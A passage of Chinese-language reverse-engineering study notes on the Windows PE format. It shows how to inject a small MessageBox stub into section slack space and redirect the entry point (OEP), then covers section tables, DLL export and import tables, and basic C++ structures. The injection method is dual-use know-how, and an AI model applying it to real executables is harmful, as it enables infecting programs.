edi,edi</span><br><span class=\"line\">7650FD20    55              push    ebp</span><br><span class=\"line\">7650FD21    8BEC            mov     ebp,esp</span><br><span class=\"line\">7650FD23    6A 00           push    0x0</span><br><span class=\"line\">7650FD25    FF75 14         push    dword ptr ss:[ebp+0x14]</span><br><span class=\"line\">7650FD28    FF75 10         push    dword ptr ss:[ebp+0x10]</span><br><span class=\"line\">7650FD2B    FF75 0C         push    dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">7650FD2E    FF75 08         push    dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">7650FD31    E8 A0FFFFFF     call    MessageBoxExA</span><br><span class=\"line\">7650FD36    5D              pop     ebp</span><br><span class=\"line\">7650FD37    C2 1000         retn    0x10</span><br><span class=\"line\"></span><br><span class=\"line\">760634D0 &lt;user32.MessageB | 8BFF                        | mov edi,edi                           |</span><br><span class=\"line\">760634D2                  | 55                          | push ebp                              |</span><br><span class=\"line\">760634D3                  | 8BEC                        | mov ebp,esp                           |</span><br><span class=\"line\">760634D5                  | 833D 948C0876 00            | cmp dword ptr ds:[76088C94],0         |</span><br><span class=\"line\">760634DC                  | 74 22                       | je user32.76063500                    |</span><br><span class=\"line\">760634DE                  | 64:A1 18000000              | mov eax,dword ptr fs:[18]             |</span><br><span class=\"line\">760634E4                  | BA 9C910876                 | mov edx,user32.7608919C               |</span><br><span class=\"line\">760634E9                  | 8B48 24                     | mov ecx,dword ptr ds:[eax+24]         |</span><br><span class=\"line\">760634EC                  | 33C0                        | xor eax,eax                           |</span><br><span class=\"line\">760634EE                  | F0:0FB10A                   | lock cmpxchg dword ptr ds:[edx],ecx   |</span><br><span class=\"line\">760634F2                  | 85C0                        | test eax,eax                          |</span><br><span class=\"line\">760634F4                  | 75 0A                       | jne user32.76063500                   |</span><br><span class=\"line\">760634F6                  | C705 008D0876 01000000      | mov dword ptr ds:[76088D00],1         |</span><br><span class=\"line\">76063500                  | 6A FF                       | push FFFFFFFF                         |</span><br><span class=\"line\">76063502                  | 6A 00                       | push 0                                |</span><br><span class=\"line\">76063504                  | FF75 14                     | push dword ptr ss:[ebp+14]            |</span><br><span class=\"line\">76063507                  | FF75 10                     | push dword ptr ss:[ebp+10]            |</span><br><span class=\"line\">7606350A                  | FF75 0C                     | push dword ptr ss:[ebp+C]             |</span><br><span class=\"line\">7606350D                  | FF75 08                     | push dword ptr ss:[ebp+8]             |</span><br><span class=\"line\">76063510                  | E8 3B020000                 | call &lt;user32.MessageBoxTimeoutA&gt;      |</span><br><span class=\"line\">76063515                  | 5D                          | pop ebp                               |</span><br><span class=\"line\">76063516                  | C2 1000                     | ret 10                                |</span><br><span class=\"line\"></span><br><span class=\"line\">E8 3B020000                 | call &lt;user32.MessageBoxTimeoutA&gt;</span><br><span class=\"line\">E9 ????????\t\t\t\t\t| jmp ????????</span><br><span class=\"line\"></span><br><span class=\"line\">跳转的地址 = E8这条指令下一行地址 + X\t\t\t\t\t  X =  </span><br><span class=\"line\">跳转的地址 = E8当前的地址 + 5 + X\t\t\t\t\t\tX = 跳转的地址 - （E8的地址 + 5）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">6A 00 6A 00 6A 00 6A 00 E8 00 00 00 00 E9 00 00 00 00</span><br><span class=\"line\"></span><br><span class=\"line\">ImageBase = 400000</span><br><span class=\"line\">400000 + 10D4F = 410D4F</span><br><span class=\"line\">410D4F-411b02</span><br><span class=\"line\">760634D0 - 411afd</span><br><span class=\"line\">11af0</span><br><span class=\"line\"></span><br><span class=\"line\">1.将节中多余部分改写为6A 00 6A 00 6A 00 6A 00 E8 00 00 00 00 E9 00 00 00 00</span><br><span class=\"line\">2.计算E8 和 E9之后的地址</span><br><span class=\"line\">跳转的地址 = E8这条指令下一行地址 + X</span><br><span class=\"line\">E8 = 760634D0 - 411afd     (411afd为E9的地址，就是E8的下一条地址)</span><br><span class=\"line\">E9 = 410D4F - 411b02       (imagebase+OEP)-(imagebase+E9下一条地址)</span><br><span class=\"line\">3.更改OEP为我们代码开始的地址 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">创建新节</span><br><span class=\"line\">1.新增一个节</span><br><span class=\"line\">2.在新节后面填充一个节大小的00</span><br><span class=\"line\">3.修改PE头中节的数量</span><br><span class=\"line\">4.修改sizeofimage</span><br><span class=\"line\">5.原有数据后新增内存对齐整数倍的一个节</span><br><span class=\"line\">6.修改节表</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">扩大节</span><br><span class=\"line\">1.拉伸到内存</span><br><span class=\"line\">2.分配一块显得空间 sizeofimage + x</span><br><span class=\"line\">3.将最后一个接的sizeofraw和vs改为N</span><br><span class=\"line\">3.修改sizeofimage大小</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">image_directory </span><br><span class=\"line\">记录编译器生成的数据在哪里</span><br></pre></td></tr></table></figure>\n<h3 id=\"静态链接库\"><a class=\"markdownIt-Anchor\" href=\"#静态链接库\">#</a> 静态链接库</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.创建静态lib</span><br><span class=\"line\">2.复制debug下的 .lib 和 .h到当前工程 </span><br><span class=\"line\">3.在需要使用的项目中 #include &quot;x.h&quot;   #pragma comment(lib,&quot;x.lib&quot;)</span><br></pre></td></tr></table></figure>\n<p>或者手动连接</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230212154955361.png\" alt=\"image-20230212154955361\"></p>\n<p>二进制代码直接编译到 exe 中</p>\n<p>改代码需要重新编译 exe</p>\n<h3 id=\"动态链接库\"><a class=\"markdownIt-Anchor\" href=\"#动态链接库\">#</a> 动态链接库</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数声明：</span><br><span class=\"line\">extern &quot;C&quot; _declspec(dllexport) __stdcall int Add(int ,int);</span><br><span class=\"line\"></span><br><span class=\"line\">1、 extern表示这是个全局函数，可以供各个其他的函数调用;  </span><br><span class=\"line\">2、&quot;℃”按照c语言的方式进行编译、链接</span><br><span class=\"line\">3、declspec(dllexport)告诉编译器此函数为导出函数;</span><br><span class=\"line\"></span><br><span class=\"line\">如果不加 “C”会按照C++导出为了防止重载会在函数名后加上符号</span><br><span class=\"line\"></span><br><span class=\"line\">动态链接库代码编译后在自己的dll中</span><br></pre></td></tr></table></figure>\n<p>VC6 自带 depend 识别 dll</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230212161253514.png\" alt=\"image-20230212161253514\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用dll</span><br><span class=\"line\">1.隐式连接</span><br><span class=\"line\">将lib，dll放在工程目录下，代码存在于dll中</span><br><span class=\"line\">#pragma comment(lib,&quot;x.lib&quot;)</span><br><span class=\"line\">extern &quot;C&quot; _declspec(dllimport) __stdcall int Add(int ,int);</span><br><span class=\"line\"></span><br><span class=\"line\">2,.显示连接</span><br><span class=\"line\">定义函数指针 typedef int (__stdcall *lpPlus)(int ,int);</span><br><span class=\"line\">声明指针类型变量 lpPlus myPlus;</span><br><span class=\"line\">动态加载dll到内存中 #include &lt;Windows.h&gt;  HINSTANCE hModule = LoadLibrary(&quot;x.dll&quot;);</span><br><span class=\"line\">获取函数地址 mpPlus = (lpPlus)GetProcAddress(hModule, &quot;Plus&quot;);</span><br><span class=\"line\">myPlus(1,2);</span><br></pre></td></tr></table></figure>\n<p>dll 中代码修改后不需要重新编译 exe</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄。</span><br><span class=\"line\">HMODULE是代表应用程序载入的模块</span><br><span class=\"line\">HINSTANCE在win32下与HMODULE是相同的东西Win16遗留</span><br><span class=\"line\">HWND是窗口句柄</span><br><span class=\"line\">本质都是无符号整数</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.def无函数名导出</span><br><span class=\"line\">新建.def文件,使用序号到达隐藏</span><br><span class=\"line\"></span><br><span class=\"line\">EXPORTS</span><br><span class=\"line\">Plus @12</span><br><span class=\"line\">Sub @15 NONAME</span><br></pre></td></tr></table></figure>\n<h3 id=\"导出表\"><a class=\"markdownIt-Anchor\" href=\"#导出表\">#</a> 导出表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exe和dll都可以提供函数</span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class=\"line\">    DWORD   Characteristics;</span><br><span class=\"line\">    DWORD   TimeDateStamp;</span><br><span class=\"line\">    WORD    MajorVersion;</span><br><span class=\"line\">    WORD    MinorVersion;</span><br><span class=\"line\">    DWORD   Name;</span><br><span class=\"line\">    DWORD   Base;</span><br><span class=\"line\">    DWORD   NumberOfFunctions;</span><br><span class=\"line\">    DWORD   NumberOfNames;</span><br><span class=\"line\">    DWORD   AddressOfFunctions;     // RVA from base of image</span><br><span class=\"line\">    DWORD   AddressOfNames;         // RVA from base of image</span><br><span class=\"line\">    DWORD   AddressOfNameOrdinals;  // RVA from base of image</span><br><span class=\"line\">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class=\"line\"></span><br><span class=\"line\">AddressOfFunc 和 AddressOfnames 长度可以不一样，可以存在noname函数或者两个函数名称指向一个函数地址</span><br><span class=\"line\">NumberofName只代表以函数名导出的个数</span><br><span class=\"line\"></span><br><span class=\"line\">通过函数名找函数时，先把AddressOfName转成FOA在比较字符串</span><br><span class=\"line\">再把查找到的AoN索引到AoO中找索引对应的值，这个值就是AoF里面的值</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">用序号找</span><br><span class=\"line\">序号 - base = AoF的序号</span><br></pre></td></tr></table></figure>\n<h3 id=\"重定位表\"><a class=\"markdownIt-Anchor\" href=\"#重定位表\">#</a> 重定位表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">为了提高搜索的速度，模块间地址也是要对齐的模块地址对齐为10000H也就是64K</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"移动导出表\"><a class=\"markdownIt-Anchor\" href=\"#移动导出表\">#</a> 移动导出表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.在DLL中新增节，返回FOA</span><br><span class=\"line\">2.复制AddressOfFunctions 长度 4*NumberOfFunctions</span><br><span class=\"line\">3.移动AddressOfNameOrdinals 长度 2*NumberOfNames</span><br><span class=\"line\">4.复制AddressOfNames 长度  4*NumberOfNames</span><br><span class=\"line\">5.复制函数名 长度不确定，直接修复AddressOfNames</span><br><span class=\"line\">6.复制_IMAGE_EXPORT_DIRECTORY结构</span><br><span class=\"line\">7.修复_IMAGE_EXPORT_DIRECTORY中的AddressOfFunctions，AddressOfNames，AddressOfNameOrdinals</span><br><span class=\"line\">8.修复目录项中的值，指向新的_IMAGE_EXPORT_DIRECTORY</span><br></pre></td></tr></table></figure>\n<h3 id=\"导入表\"><a class=\"markdownIt-Anchor\" href=\"#导入表\">#</a> 导入表</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class=\"line\">    union &#123;</span><br><span class=\"line\">        DWORD   Characteristics;            // 0 for terminating null import descriptor</span><br><span class=\"line\">        DWORD   OriginalFirstThunk;         // RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br><span class=\"line\">    &#125; DUMMYUNIONNAME;</span><br><span class=\"line\">    DWORD   TimeDateStamp;                  // 0 if not bound,</span><br><span class=\"line\">                                            // -1 if bound, and real date\\time stamp</span><br><span class=\"line\">                                            //     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br><span class=\"line\">                                            // O.W. date/time stamp of DLL bound to (Old BIND)</span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD   ForwarderChain;                 // -1 if no forwarders</span><br><span class=\"line\">    DWORD   Name;</span><br><span class=\"line\">    DWORD   FirstThunk;                     // RVA to IAT (if bound this IAT has actual addresses)</span><br><span class=\"line\">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class=\"line\">typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>\n<p>PE 文件加载前</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230222142303612.png\" alt=\"image-20230222142303612\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过导入表的FirstThunk找到IAT</span><br><span class=\"line\">或者通过IMAGE_DATA_DIRECTORY的倒数第三张表找到IAT</span><br></pre></td></tr></table></figure>\n<p>加载后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230222143253824.png\" alt=\"image-20230222143253824\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INT 表作为加载后函数名的备份</span><br></pre></td></tr></table></figure>\n<p>定位导入表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">目录项目的第二个结构就是导入表</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"绑定导入表\"><a class=\"markdownIt-Anchor\" href=\"#绑定导入表\">#</a> 绑定导入表</h3>\n<p>timedatestamp = -1 代表已经绑定了地址，真正的绑定时间为 IMAGE_BOUND_IMPORT_DES 的 TimeDateStamp</p>\n<p>0 带包代表还没绑定</p>\n<p>绑定导入表位于数据目录的第 12 项</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR &#123;</span><br><span class=\"line\">    DWORD   TimeDateStamp;</span><br><span class=\"line\">    WORD    OffsetModuleName;</span><br><span class=\"line\">    WORD    NumberOfModuleForwarderRefs;    // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span><br><span class=\"line\">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_BOUND_FORWARDER_REF &#123;</span><br><span class=\"line\">    DWORD   TimeDateStamp;</span><br><span class=\"line\">    WORD    OffsetModuleName;</span><br><span class=\"line\">    WORD    Reserved;</span><br><span class=\"line\">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"c\"><a class=\"markdownIt-Anchor\" href=\"#c\">#</a> C++</h2>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">haha</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">fun</span><span class=\"params\">(haha h)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\thaha sb;</span><br><span class=\"line\">\t<span class=\"built_in\">fun</span>(sb);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401068</span> <span class=\"number\">83</span> EC <span class=\"number\">0</span>C             sub         esp,<span class=\"number\">0</span>Ch</span><br><span class=\"line\"><span class=\"number\">0040106B</span> <span class=\"number\">8B</span> C4                mov         eax,esp</span><br><span class=\"line\"><span class=\"number\">0040106</span>D <span class=\"number\">8B</span> <span class=\"number\">4</span>D F4             mov         ecx,dword ptr [ebp<span class=\"number\">-0</span>Ch]</span><br><span class=\"line\"><span class=\"number\">00401070</span> <span class=\"number\">89</span> <span class=\"number\">08</span>                mov         dword ptr [eax],ecx</span><br><span class=\"line\"><span class=\"number\">00401072</span> <span class=\"number\">8B</span> <span class=\"number\">55</span> F8             mov         edx,dword ptr [ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">00401075</span> <span class=\"number\">89</span> <span class=\"number\">50</span> <span class=\"number\">04</span>             mov         dword ptr [eax+<span class=\"number\">4</span>],edx</span><br><span class=\"line\"><span class=\"number\">00401078</span> <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040107B</span> <span class=\"number\">89</span> <span class=\"number\">48</span> <span class=\"number\">08</span>             mov         dword ptr [eax+<span class=\"number\">8</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040107</span>E E8 <span class=\"number\">82</span> FF FF FF       call        @ILT+<span class=\"number\">0</span>(fun) (<span class=\"number\">00401005</span>)</span><br><span class=\"line\"><span class=\"number\">00401083</span> <span class=\"number\">83</span> C4 <span class=\"number\">0</span>C             add         esp,<span class=\"number\">0</span>Ch</span><br><span class=\"line\"></span><br><span class=\"line\">结构体作为参数时传的是结构体的副本，应该使用结构体指针</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Max</span><span class=\"params\">(haha* sb)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(sb-&gt;x &gt; sb-&gt;y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体指针用-&gt;取结构体的成员</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">haha</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"type\">int</span> z;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Max</span><span class=\"params\">(haha* sb)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(sb-&gt;x &gt; sb-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//结构体中不计算函数的大小</span></span><br><span class=\"line\"><span class=\"comment\">//函数在结构体里时会默认传递一个参数，即结构体的首地址，放在ECX中，用于标识成员在那个对象中</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当参数和变量同名时使用this</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">init</span><span class=\"params\">(<span class=\"type\">int</span> x, <span class=\"type\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;x = x;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>-&gt;y = y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//返回当前对象首地址</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> *(<span class=\"type\">int</span>*)<span class=\"keyword\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//this不允许重新赋值</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230225145426715.png\" alt=\"image-20230225145426715\"></p>\n<p>3. 孔结构体大小是多少</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x + <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Sub</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">this</span>-&gt;x - <span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span 